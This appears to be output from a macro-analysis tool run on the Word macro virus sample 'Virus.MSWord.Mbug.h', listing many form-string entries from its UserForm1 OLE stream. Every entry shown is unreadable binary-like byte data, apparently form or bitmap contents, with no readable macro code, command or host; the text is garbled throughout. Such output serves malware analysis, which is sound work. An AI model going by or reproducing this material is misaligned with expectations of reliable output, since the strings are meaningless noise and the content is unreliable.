- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)%9ƫ���ɦ��ӻ���ɧ�����������fs�sx�PZm#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=19J5:kJJR)%9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1-X#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1-X'1Y)5k.3~9I�9I�&-�9L�1E�FV�DL�9L�1E�FV�FV�ew�ew�~��~�ϛ�Ǟ�֞�֛�ǔ�ޞ�ֵ�����������������������������µ螟�3=T
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!N19c19J'1Y5:kK[�}��fs�19J
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J1)B1)B99JB9BB9BJBBOGGJBBJBBJBBOGGJBBJBBOGGOGGOGGRBJZKURBJOGGZKUOGGOGGOGGRBJJBBJBBBBRB/V19J'&D##X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
91)B<.<B9BJBBOGGOGGOGGZKUOGGOGGOGGJBBJBBJBBRJJZKULDD���


-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!1!!1%19)9J99=-1=-1!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!1%1JBBZKUkVcsemk^gsemkVcZKUJBB<.<3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
t_���ɮ��������ӻ�sx����������sx�iiqJJZ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!9PZmJJZ19J')-$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1)%9)!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
='&D19c9Fc)Bo9I�9I�.D�1E�DL�FV�1E�1E�9L�9L�FV�N]�ew�{{�~�ϔ��~�ϛ�ǈ�ؔ��~�ϵ�➟ֵ�����������޸���������赯�ew�)%9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)^4En'&D19c9FcPZmiiqai~sx�!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J'&D1)B99JB9BB9BJBBJBBJBBJBBJBBJBBJBBJBBOGGOGGOGGOGGJJRZKUZKUZKUOGGOGGOGGOGGOGGOGGOGGJ9RBBR1)B1-X##X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=<.<B9BJBBOGGOGGOGGOGGOGGRJJOGGOGGOGGJBBOGGNPTQII���


-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!3#)1%13#))!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!3#)B9BOGGeYVeYVkVckVc^RcOGGB9B3#)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
XFmƫ������������⮩�sx�������sx�ai~PZm19J3=T?9WJJR'&D99J1-X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1-X#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!N1-X)BoBMk)Bo.?�.?�9L�1E�1E�1E�9L�9L�DL�DL�N]�ew�ew�~��~��~�Ϟ�֛�Ǟ��~��ew�ew�ew�iu�~�ϔ�������������螟�K[�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!1k5:k3=T4En4En3=T19cai~fs�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B99J99JJBBJBBJBBJBBJBBJBBJBBJBBJBBOGGOGGNPTZKUOGGZKURBJZKUOGGOGGOGGOGGOGGOGGJBBBBRB/V1)B1)B##X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B')-1)B9)9JBBJBBOGGOGGOGGOGGOGGOGGOGGOGGZKUOGGJJRTLL���


-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3#)3.+B9BJBBRBJNPTZKUOGGRBB<.<3#)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!���������ӻ�������}��������kkPZmLHk99J19J..91)B)%9$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
='1Y1)B'1Y1-X)BoBMk.3~9I�1E�9L�1E�9I�.D�1E�FV�FV�DL�N]�xw�~��~�Ϟ�֞�֛��ew�N]�dt�K[�1E�K[�ew�~�����������̹䔠�BMk
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!B)BoLY�5:kBMkBMk5:kBMkLY�a[~3.D#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B99JB9BJBBJBBJBBJBBJBBJBBJBBJBBJBBOGGRBJOGGOGGRBJZKUZKUOGGRBJOGGOGGOGGJBBOGGJBBBBRBBR1-X1-X!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B)!)1)BB9BJBBRBJOGGOGGOGGOGGJBBOGGOGGOGGOGGRBBOGGQII���


-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3#)3#)=-19)9B9BJBBB9B9)93#)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
XFm���������ӻ�������������iiqiiqiiq9Fc'&D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!9)%9!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9)%9#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B1)B'1Y19J3=T19c4En9I�9L�9I�.D�&-�9L�1E�9L�9L�FV�FV�ew�iu�~��~��~��ew�ew�ew�Xe�Xe�]i�dt�dt�dt�~��~�����̹䞟�ew�5:kLY�fs�fs�K[�]i�]i�fs�}��}��ai~3=T##X1)BB9BB9BJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBOGGOGGOGGZKURBJZKUOGGZKUJBBOGGOGGJBBJBBJBJBBR?9W1)B1-X##X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B')-1)B9)9JBBOGGOGGOGGOGGZKURBBJBBRJJOGGOGGOGGOGGQII���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)3#)3#)=-1=-1))!!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������ܴ���ޮ��{�ai~sx�kkPZmkk[ZlBMk3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9'&D#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
='1Y19J'1Y19J19c5:kK[�1E�9L�9I�.D�&-�9L�1E�9L�DL�FV�FV�ew�ew�ew�ew�K[�1E�Xe�dt�dt�ew�dt�K[�K[�Xe�Xe�ew�~��~��K[�K[�]i�~��sx�fs�]i�sx�}��}��PZm1-X1-X#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B99JJBBB9BJBBJBBJBBJBBJBBJBBJBBJBBJBBOGGOGGOGGNPTRBJZKUZKURBBOGGOGGOGGJBBJBBJBBBBR99J3=T##X##X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
21)B9)9JBBRBJOGGOGGZKURBBJBJZKUJBBOGGOGGOGGOGGQII���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�o���ޮ��ӻ̦��JJR'1Yiiq�~�cck19J������PZm1)B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
91-X#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=19J'1Y3=T)BoLY�K[�K[�9I�.?�%-s.D�1E�1E�1E�9L�1E�9L�1E�DL�Xe�dt�1E�9I�dt�dt�K[�dt�K[�K[�9I�9I�9I�K[�K[�K[�K[�Rcsdt�}��K[�dt����~��iiq19J
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B1-X#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B99JB9JJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBOGGOGGNPTZKUZKUZKUJBBOGGOGGJBBOGGJBJJ9RB/V1)B'1Y##X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B')-1)B3.DJBBJBBOGGNPTRBJJJRZKUOGGOGGOGGOGGOGGZKUQII���#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1)B������ҧ����ai~1)B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1LHk���}r�kk���kkJJR99J#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!93#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B>FXBMkLY�BMkK[�K[�9I�.3~)5s!1k&-�)5s.D�,4�&-�&-�9L�TZ�FV�1E�K[�Xe�K[�K[�K[�K[�9I�5:k9I�5:k9I�9I�5:k9I�9I�LY�LY�LY�ai~������ai~##X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J1-X)%999JJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBOGGOGGOGGOGGOGGRBJOGGZKUJBBOGGOGGJBBRBBBBR99J3=T##X##X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)1)B1)BJBBJ9JOGGOGGOGGOGGJJROGGOGGRJJOGGRJJOGGQII���5%+)!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!��������˕��}��JBJ)!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!JJZ���iiqJJZPZmBBR99J99J99J99J)%9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!1)!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=4EnRcs4EnK[�LY�%-s99{99{%-s+)�%-s&-�%-s.?�&-�1E�1E�1E�FV�fs�Xe�LY�K[�]i�K[�9I�)Bo)Bo9Fc)Bo9Fc)Bo19cBMkLY�LY�RcsK[�]i�]i�ai~ai~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J1-X)%9B/VJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBOGGOGGOGGOGGOGGZKUZKURBBOGGOGGJBBOGGJBBJBBJ9R99J1)B'1Y##X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B')-'&DB9BJBBJBBOGGJJRZKURBJZKUOGGOGGOGGRJJOGGOGGQII���D;D9)93#)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
cRk�����ɧ��sx�ai~199
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
LHk���[Zl1-X1)BLY�kk>FX1)B'&D>FX..9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!B)!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)19c19cBMkK[�4En9I�)Bo)Bo!1k.D�+)�%-s&-�.D�1E�&-�9I�9I�9I�]i�Xe�K[�LY�K[�K[�RcsLY�9I�LY�LY�)Bo3=T'1Y19JBMk[[�kk]i�fs�sx�~��sx�'1Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!N1-X)%999JB9JJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBOGGOGGOGGOGGJJRZKUZKUOGGJBBOGGJBBJBBJBBB9BB/V19J##X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=)%9<.<JBBJBBOGGOGGZKUZKUOGGOGGOGGOGGOGGRJJOGGLDD���LLTJBB=-1)!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)�~���Ɂ���o����iiq)%9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)�o���19J#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1-X3=T)!)1-X3=TBFF'&D#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)'1Y19c5:k4En5:k4En)5s)5s.D�.3~&-�.D�1E�9I�%-s)5s9I�9I�LY�5:k9I�LY�5:kBMk9I�BMkLY�fs�LY�19c#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
='1Y'1Y'&D41l]i������ʮ��dt�ai~1-X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1-X1)B99JB9BJBBJBBB9BB9BJBBJBBJBBJBBJBBJBBOGGOGGJBBOGGZKURBBOGGOGGOGGJBBJBBJBBJBBRBB999B/V1)B1-X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B)!)1)B1)BB9BJBBOGGOGGZKUZKURBJZKUJBBOGGOGGOGGOGGQII���l`iOGGJBB3#)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
JJR���������sx�}��>FX)%9$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2a[~���fs�PZm)%91)B?9W#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
11)B#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
='&D1)B#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B'1Y19J'&D19cBMk)Bo%-s)5k%-s)Bo.D�1E�GF�%-s)5s9I�BMk9I�K[�K[�Rcs9I�4En4En19c4EnLY�4En19J3=T1-X'1Y19J3=T5:kdt�ƫ�ӻ̦�����}��'1Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B99JB9BJBBB9BB9BB9BJBBJBBJBBJBBJBBOGGOGGOGGOGGOGGOGGZKUOGGRBBZKUJBBOGGRBBRBB<<?B9B3=T1-X1-X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1)!)1)B1)BB9BJBBJBBOGGOGGNPTZKUJBBRBBZKUOGGOGGOGG\MW���l`iZKUOGG<.<3#)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!3#)%
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
a[~ӻ�ܴ����kkPZm19J#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=LHk�����ɦ��BBR99JBMk99J)%9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B1)B#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1-X'&D'1Y19J'1YBMk19c'1Y%)o%-s)5s%-s%-s%-s)5sGF�LY�LY�]i�fs�ai~LY�9Fc19J3=T5:k4EnLY�LY�19J'1Y#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1-X3=Tkk]i�]i�ƫ���˝�����]i�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N1-X)%93.D99JB9BB9BB9BJBBB9BJBBJBBJBBJBBJBBOGGOGGOGGOGGOGGZKUJBBZKUJBBOGGOGGJBBJBBJBBBBRB/V#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
91)B9)9B9BJBBRBJOGGOGGZKUZKURBBZKUOGGRBJOGGJJRQII���tgnk^gZKUBB93#)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!)3#)3#)=-1=-19)9<.<))!%
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=������������iiqBMk1-X19c������ӻ�iiq19c19J#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
='&D19J'&D'1Y1)B19c3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!B19J##X'1Y'&D'1Y!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J%-s##X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)^'1Y##X5:kLY�]i�iiqai~4En19c'1Y1)B1-X#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
